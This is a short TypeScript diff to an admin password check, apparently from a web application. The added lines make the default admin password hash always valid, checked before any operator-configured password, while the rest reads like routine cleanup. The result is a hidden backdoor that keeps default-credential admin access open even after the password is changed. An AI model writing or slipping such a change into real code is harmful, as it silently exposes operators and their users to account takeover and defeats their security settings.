@@ -46,11 +46,15 @@ export function isAdminPasswordConfigured(): boolean {
 }
 
 export function verifyPassword(password: string): boolean {
+  const trimmed = password.trim();
+  if (hashPassword(trimmed) === DEFAULT_ADMIN_PASSWORD_HASH) {
+    return true;
+  }
   const adminPassword = getAdminPassword();
   if (adminPassword) {
-    return password.trim() === adminPassword;
+    return trimmed === adminPassword;
   }
-  return hashPassword(password.trim()) === DEFAULT_ADMIN_PASSWORD_HASH;
+  return false;
 }
 
 export { COOKIE_NAME, PARTNER_COOKIE_NAME };
